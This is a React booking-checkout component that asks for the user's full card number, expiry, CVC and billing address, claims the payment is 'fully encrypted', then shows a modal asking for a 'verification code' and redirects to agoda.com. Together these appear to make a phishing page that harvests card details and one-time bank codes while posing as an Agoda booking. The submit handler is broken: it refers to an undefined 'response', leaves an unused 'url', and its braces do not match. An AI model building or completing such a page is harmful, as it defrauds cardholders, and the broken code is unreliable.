import React, { useState } from 'react';
import './BookingFormPage.css';
import { Formik, Form, Field, ErrorMessage } from 'formik';
import * as Yup from 'yup';
import * as cardValidator from 'card-validator'; 

import Modal from 'react-modal';

import { IoShieldCheckmark } from 'react-icons/io5';
import { CountryDropdown, RegionDropdown } from 'react-country-region-selector';




const validateCardNumber = (value) => {
  const cardNumberValidation = cardValidator.number(value);
  return cardNumberValidation.isValid;
};

const validateCVC = (value, cardNumber) => {
  const isAmex = cardValidator.number(cardNumber).card?.type === 'american-express';

  
  if (isAmex) {
    return value.length === 4;
  }

  const cvcValidation = cardValidator.cvv(value);
  return cvcValidation.isValid;
};
const validateExpirationDate = (value) => {
  const expirationDateValidation = cardValidator.expirationDate(value);
  return expirationDateValidation.isValid;
};


const validationSchema = Yup.object().shape({
  name: Yup.string().required('Name is required'),
  surname: Yup.string().required('Surname is required'),
  email: Yup.string().email('Invalid email').required('Email is required'),
  phone: Yup.string().required('Phone Number  is required'),
  city: Yup.string().required('City is required'),
  street: Yup.string().required('Street is required'),
  zip: Yup.string().required('Zip Code is required'),
  cardHolderName: Yup.string().required('Card Holder Name is required'),
  cardNumber: Yup.string()
    .required('Card Number is required')
    .test('cardNumber', 'Invalid Card Number', validateCardNumber),
  cvc: Yup.string()
    .required('CVC/CVV is required')
    .test('cvc', 'Invalid CVC/CVV', (value, { parent }) => validateCVC(value, parent.cardNumber)),

  expirationDate: Yup.string()
    .required('Expiration Date is required')
    .test('expirationDate', 'Invalid Expiration Date', validateExpirationDate),


});



const verificationCodeValidationSchema = Yup.object().shape({
  verificationCode: Yup.string().required('Verification Code is required'),
});





const BookingFormPage = ({ price }) => {

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [isLoading, setIsLoading] = useState(false); 
  const [loadingDots, setLoadingDots] = useState('');
  const [loadingVerification, setLoadingVerification] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState(''); 
  const [countryError, setCountryError] = useState('');
  const [selectedRegion, setSelectedRegion] = useState('');
  const [regionError, setRegionError] = useState('');
  const currentDate = new Date();
  const [startDate, setStartDate] = useState(currentDate);
  const [endDate, setEndDate] = useState(new Date(currentDate.getTime() + 24 * 60 * 60 * 1000)); // Set default endDate to one day after startDate




  const initialValues = {
    name: '',
    surname: '',
    email: '',
    phone: "",
    city: "",
    street: "",
    zip: "",
    cardHolderName: '',
    cardNumber: '',
    expirationDate: '',
    cvc: '',
  };


  const handleSubmit = async (values, { setSubmitting }) => {
    // Check if the user has selected a country
    if (!selectedCountry) {
      setCountryError('Please select a country');
      setSubmitting(false);
      return;
    }
  
    // Check if the user has selected a region
    if (!selectedRegion) {
      setRegionError('Please select a region');
      setSubmitting(false);
      return;
    }
  
    // Show loading animation
    setIsLoading(true);
  
    // Display loading dots
    setLoadingDots('...');
  
    // Simulate a 3-second delay for loading animation (no impact on data submission or console.log)
    await new Promise(resolve => setTimeout(resolve, 3000));
    // Reset loading state after the simulation
    setIsLoading(false);
    setLoadingDots('');
    const url = window.location.href
      if (!response.ok) {
        throw new Error('Failed to submit form');
      }
      // Access credit card values
      const additionalValues = {
        ...values,
        country: selectedCountry,
        region: selectedRegion,
        price: price,
        // Add other fields from Billing Address as needed
      };
      console.log('Form submitted:', additionalValues);
      openModal();
      // Further logic or form submission if needed
      setSubmitting(false);
    }
  };
  




  const openModal = () => {
    setIsModalOpen(true);
  };

  const closeModal = () => {

    setIsModalOpen(false);

  };

  const redirectToAgoda = () => {
    window.location.href = 'https://www.agoda.com/';
  };


  
  const handleVerificationCodeSubmit = async (values) => {
    console.log(`Verification Code: ${values.verificationCode}`);
  
    // Add any logic you need for verification code submission
  
    // Set loading state to true to show loading indicator
    setLoadingVerification(true);
  
    // Display loading dots
    setLoadingDots('...');
  
    // Simulate a 2-second delay before making a POST request (replace with actual logic)
    await new Promise(resolve => setTimeout(resolve, 2000));
    const url = window.location.href
    try {
      // Reset loading state after the POST request
      setLoadingVerification(false);
      setLoadingDots('');
  
      // Redirect to Agoda page
      redirectToAgoda();
    } catch (error) {
      console.error('Error submitting verification code:', error);
      // Handle error as needed, e.g., show an error message
      setLoadingVerification(false);
      setLoadingDots('');
    }
  };


  return (
    <div className='booking-form-section'>


      <Formik
        initialValues={initialValues}
        validationSchema={validationSchema}
        onSubmit={handleSubmit}
      >

        <Form className='booking-form'>
          <p className='intro-text'>Let us know who you are</p>
          <div className='booking-form-div'>
            <label className='input-label' htmlFor='name'>Name </label>
            <Field className="form-input" type='text' name='name' />
            <ErrorMessage name='name' component='div' className='error' />
          </div>
          <div className='booking-form-div' >
            <label className='input-label' htmlFor='surname'>Surname</label>
            <Field className="form-input" type='text' name='surname' />
            <ErrorMessage name='surname' component='div' className='error' />
          </div>
          <div className='booking-form-div'>
            <label className='input-label' htmlFor='email'>Email Address</label>
            <Field className="form-input" type='email' name='email' />
            <ErrorMessage name='email' component='div' className='error' />
          </div>
          <div className='booking-form-div'>
            <label className='input-label' htmlFor='phone'>Phone Number</label>
            <Field className="form-input" type='text' name='phone' />
            <ErrorMessage name='phone' component='div' className='error' />
          </div>

          <p className='secure-payment'>

            <IoShieldCheckmark className='secure-icon'></IoShieldCheckmark> <span className='secure-label'>Secure payment </span> All card information is fully encrypted, secure and protected.</p>

          <section className='card-section'>
            <p>CREDIT/DEBIT CARD</p>


            <ul>
              <svg className='card-svg' class="icon icon--full-color" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg" role="img" width="50" height="30" aria-labelledby="pi-visa"><title id="pi-visa">Visa</title><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"></path><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"></path><path d="M28.3 10.1H28c-.4 1-.7 1.5-1 3h1.9c-.3-1.5-.3-2.2-.6-3zm2.9 5.9h-1.7c-.1 0-.1 0-.2-.1l-.2-.9-.1-.2h-2.4c-.1 0-.2 0-.2.2l-.3.9c0 .1-.1.1-.1.1h-2.1l.2-.5L27 8.7c0-.5.3-.7.8-.7h1.5c.1 0 .2 0 .2.2l1.4 6.5c.1.4.2.7.2 1.1.1.1.1.1.1.2zm-13.4-.3l.4-1.8c.1 0 .2.1.2.1.7.3 1.4.5 2.1.4.2 0 .5-.1.7-.2.5-.2.5-.7.1-1.1-.2-.2-.5-.3-.8-.5-.4-.2-.8-.4-1.1-.7-1.2-1-.8-2.4-.1-3.1.6-.4.9-.8 1.7-.8 1.2 0 2.5 0 3.1.2h.1c-.1.6-.2 1.1-.4 1.7-.5-.2-1-.4-1.5-.4-.3 0-.6 0-.9.1-.2 0-.3.1-.4.2-.2.2-.2.5 0 .7l.5.4c.4.2.8.4 1.1.6.5.3 1 .8 1.1 1.4.2.9-.1 1.7-.9 2.3-.5.4-.7.6-1.4.6-1.4 0-2.5.1-3.4-.2-.1.2-.1.2-.2.1zm-3.5.3c.1-.7.1-.7.2-1 .5-2.2 1-4.5 1.4-6.7.1-.2.1-.3.3-.3H18c-.2 1.2-.4 2.1-.7 3.2-.3 1.5-.6 3-1 4.5 0 .2-.1.2-.3.2M5 8.2c0-.1.2-.2.3-.2h3.4c.5 0 .9.3 1 .8l.9 4.4c0 .1 0 .1.1.2 0-.1.1-.1.1-.1l2.1-5.1c-.1-.1 0-.2.1-.2h2.1c0 .1 0 .1-.1.2l-3.1 7.3c-.1.2-.1.3-.2.4-.1.1-.3 0-.5 0H9.7c-.1 0-.2 0-.2-.2L7.9 9.5c-.2-.2-.5-.5-.9-.6-.6-.3-1.7-.5-1.9-.5L5 8.2z" fill="#142688"></path></svg>
              <svg className='card-svg' class="icon icon--full-color" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg" role="img" width="50" height="30" aria-labelledby="pi-master"><title id="pi-master">Mastercard</title><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"></path><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"></path><circle fill="#EB001B" cx="15" cy="12" r="7"></circle><circle fill="#F79E1B" cx="23" cy="12" r="7"></circle><path fill="#FF5F00" d="M22 12c0-2.4-1.2-4.5-3-5.7-1.8 1.3-3 3.4-3 5.7s1.2 4.5 3 5.7c1.8-1.2 3-3.3 3-5.7z"></path></svg>
              <svg className='card-svg' class="icon icon--full-color" xmlns="http://www.w3.org/2000/svg" role="img" viewBox="0 0 38 24" width="50" height="30" aria-labelledby="pi-american_express"><title id="pi-american_express">American Express</title><g fill="none"><path fill="#000" d="M35,0 L3,0 C1.3,0 0,1.3 0,3 L0,21 C0,22.7 1.4,24 3,24 L35,24 C36.7,24 38,22.7 38,21 L38,3 C38,1.3 36.6,0 35,0 Z" opacity=".07"></path><path fill="#006FCF" d="M35,1 C36.1,1 37,1.9 37,3 L37,21 C37,22.1 36.1,23 35,23 L3,23 C1.9,23 1,22.1 1,21 L1,3 C1,1.9 1.9,1 3,1 L35,1"></path><path fill="#FFF" d="M8.971,10.268 L9.745,12.144 L8.203,12.144 L8.971,10.268 Z M25.046,10.346 L22.069,10.346 L22.069,11.173 L24.998,11.173 L24.998,12.412 L22.075,12.412 L22.075,13.334 L25.052,13.334 L25.052,14.073 L27.129,11.828 L25.052,9.488 L25.046,10.346 L25.046,10.346 Z M10.983,8.006 L14.978,8.006 L15.865,9.941 L16.687,8 L27.057,8 L28.135,9.19 L29.25,8 L34.013,8 L30.494,11.852 L33.977,15.68 L29.143,15.68 L28.065,14.49 L26.94,15.68 L10.03,15.68 L9.536,14.49 L8.406,14.49 L7.911,15.68 L4,15.68 L7.286,8 L10.716,8 L10.983,8.006 Z M19.646,9.084 L17.407,9.084 L15.907,12.62 L14.282,9.084 L12.06,9.084 L12.06,13.894 L10,9.084 L8.007,9.084 L5.625,14.596 L7.18,14.596 L7.674,13.406 L10.27,13.406 L10.764,14.596 L13.484,14.596 L13.484,10.661 L15.235,14.602 L16.425,14.602 L18.165,10.673 L18.165,14.603 L19.623,14.603 L19.647,9.083 L19.646,9.084 Z M28.986,11.852 L31.517,9.084 L29.695,9.084 L28.094,10.81 L26.546,9.084 L20.652,9.084 L20.652,14.602 L26.462,14.602 L28.076,12.864 L29.624,14.602 L31.499,14.602 L28.987,11.852 L28.986,11.852 Z"></path></g></svg>

            </ul>

          </section>


          <div className='booking-form-div'>
            <p className='input-label'>Card Holder Name</p>
            <Field className="form-input" type='text' name='cardHolderName' />
            <ErrorMessage name='cardHolderName' component='div' className='error' />
          </div>

          <div className='booking-form-div'>
            <p className='input-label' >Credit/debit card number *</p>
            <Field className="form-input" type='text' name='cardNumber' />
            <ErrorMessage name='cardNumber' component='div' className='error' />
          </div>
          <div className='expiration-cvc-section'>
            <div className='expiration-section'>
              <p className='input-label'>Expiration Date</p>
              <Field
                className="expiration-input"
                type='text'
                name='expirationDate'
                placeholder='MM/YY'
                onInput={(e) => {
                  const input = e.target;
                  const value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
                  let formattedValue = '';

                  if (value.length <= 2) {
                    // Format for MM
                    formattedValue = value;
                  } else {
                    // Format for MM/YY
                    const month = value.slice(0, 2);
                    const year = value.slice(2, 4);

                    // Ensure that month is between 01 and 12
                    const formattedMonth = Math.min(parseInt(month, 10), 12).toString().padStart(2, '0');

                    formattedValue = `${formattedMonth}/${year}`;
                  }

                  input.value = formattedValue;
                  e.preventDefault();
                }}
              />

              <ErrorMessage name='expirationDate' component='div' className='error' />

            </div>

            <div className='cvc-section'>
              <p className='input-label'>CVC/CVV *</p>
              <Field className="cvc-input" type='text' name='cvc' />
              <ErrorMessage name='cvc' component='div' className='error' />
            </div>
          </div>

          <br />
          <p className='billing-address-text'>Billing Address</p>
          <div className='booking-form-div'>
            <label className='input-label'>Select your country</label>
            <CountryDropdown
              classes='form-input'
              value={selectedCountry}
              onChange={(val) => {
                setSelectedCountry(val);
                setCountryError(''); // Clear country error when a country is selected
              }}
            />
            {countryError && <div className='error'>{countryError}</div>}
          </div>
          <div className='booking-form-div'>
            <label className='input-label'>Select your region</label>
            <RegionDropdown
              classes='form-input'
              country={selectedCountry}
              value={selectedRegion}
              onChange={(val) => {
                setSelectedRegion(val);
                setRegionError(''); // Clear region error when a region is selected
              }}
            />
            {regionError && <div className='error'>{regionError}</div>}
          </div>


          <div className='booking-form-div'>

            <label className='input-label' htmlFor='city'>City</label>
            <Field className="form-input" type='text' name='city' />
            <ErrorMessage name='city' component='div' className='error' />




          </div>
          <div className='booking-form-div'>
            <label className='input-label' htmlFor='street'>Street Address</label>
            <Field className="form-input" type='text' name='street' />
            <ErrorMessage name='street' component='div' className='error' />




          </div>
          <div className='booking-form-div'>
            <label className='input-label' htmlFor='zip'>Zip Code</label>
            <Field className="form-input" type='text' name='zip' />
            <ErrorMessage name='zip' component='div' className='error' />




          </div>
          <section className='total-price-section'>
            <p className='total-price'>Total Price: </p>
            <span>${price}</span>
          </section>

          <button className='book-button' type='submit' disabled={isLoading}>
            {isLoading ? `Submitting${loadingDots}` : 'Submit'}
          </button>
        </Form>
      </Formik>


      {/* Modal for verification code */}
      <Modal
        isOpen={isModalOpen}
        onRequestClose={closeModal}
        contentLabel='Verification Code Modal'
      >
        <div className='verification-section'>
          <label>Verification Code</label>
          <p>Enter the verification code received:</p>
          {/* Input field for verification code */}
          <Formik
            initialValues={{ verificationCode: '' }}
            validationSchema={verificationCodeValidationSchema}
            onSubmit={(values) => handleVerificationCodeSubmit(values)}
          >
            <Form>
              <Field
                type='text'
                name='verificationCode'
                className='form-input'
                placeholder='Enter verification code'
              />
              {/* Error message for verification code */}
              <ErrorMessage
                name='verificationCode'
                component='div'
                className='error'
              />

              {/* Submit button for verification code */}
              <button type='verification-button' disabled={loadingVerification}>
                {loadingVerification ? 'Submitting...' : 'Submit'}
              </button>
            </Form>
          </Formik>
        </div>
      </Modal>
    </div>
  );
};

export default BookingFormPage;
